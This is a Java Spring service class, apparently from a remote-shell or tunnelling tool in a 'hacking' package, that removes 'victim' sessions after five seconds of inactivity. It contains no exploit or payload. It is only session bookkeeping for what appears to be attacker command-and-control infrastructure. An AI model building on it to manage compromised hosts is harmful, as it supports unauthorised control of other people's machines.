package nl.byron.hacking.service;

import nl.byron.hacking.controller.ShellController;
import nl.byron.hacking.controller.TunnelController;
import nl.byron.hacking.model.Victim;
import org.joda.time.DateTime;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.scheduling.annotation.Scheduled;
import org.springframework.stereotype.Component;

import java.util.ConcurrentModificationException;
import java.util.Map;

/**
 * @author Byron Voorbach
 */
@Component
public class CheckActiveSessionService {

    private static final Logger logger = LoggerFactory.getLogger(CheckActiveSessionService.class);

    @Autowired
    private TunnelController tunnelController;

    @Autowired
    private ShellController shellController;

    private static final int inactiveTimeoutInMillis = 5000;
    private static final int delay = 1000;

    @Scheduled(fixedDelay = delay)
    public void checkActiveConnection() {
        Map<String, Victim> victims = tunnelController.getVictims();

        try {
            for (Victim victim : victims.values()) {

                if (new DateTime().getMillis() - victim.getLastSeenAsDateTime().getMillis() > inactiveTimeoutInMillis) {
                    logger.warn("Session became invalid: " + victim.getIp());
                    tunnelController.removeVictim(victim);
                    shellController.removeVictim(victim);
                }
            }
        } catch (ConcurrentModificationException ignored) {
        }
    }
}
